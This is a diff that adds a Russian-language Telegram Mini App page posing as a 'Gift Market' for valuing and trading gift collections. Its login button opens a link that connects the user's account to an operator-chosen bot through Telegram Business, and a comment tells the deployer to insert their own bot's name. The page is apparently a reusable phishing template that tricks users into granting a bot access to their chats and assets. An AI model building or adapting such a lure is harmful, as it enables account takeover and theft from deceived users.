@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            background: #1c1c1d;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .container { margin-top: 40px; }
+        .btn {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .card {
+            background: #2c2c2e;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #3a3a3c;
+        }
+        h2 { margin-bottom: 5px; }
+        p { color: #8e8e93; font-size: 14px; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🎁 Gift Market</h2>
+        <div class="card">
+            <div style="font-size: 12px; color: #8e8e93;">Ваш баланс</div>
+            <div style="font-size: 24px; font-weight: bold;">0.00 $TON</div>
+        </div>
+
+        <p>Для оценки вашей коллекции подарков и начала торговли необходимо авторизоваться.</p>
+
+        <button class="btn" onclick="connect()">ВОЙТИ ЧЕРЕЗ TELEGRAM</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); // Раскрывает приложение на всё окно
+
+        function connect() {
+            // !!! ВНИМАНИЕ: Замените GiftAsset_Manager_bot на имя своего бота !!!
+            const botUser = "GiftAsset_Manager_bot";
+
+            // Эта ссылка запускает процесс подключения Telegram Business
+            tg.openTelegramLink(`https://t.me/${botUser}?startbusiness=auth`);
+
+            // Закрываем Mini App после нажатия, так как юзера перекинет в диалог с ботом
+            tg.close();
+        }
+    </script>
+</body>
+</html>
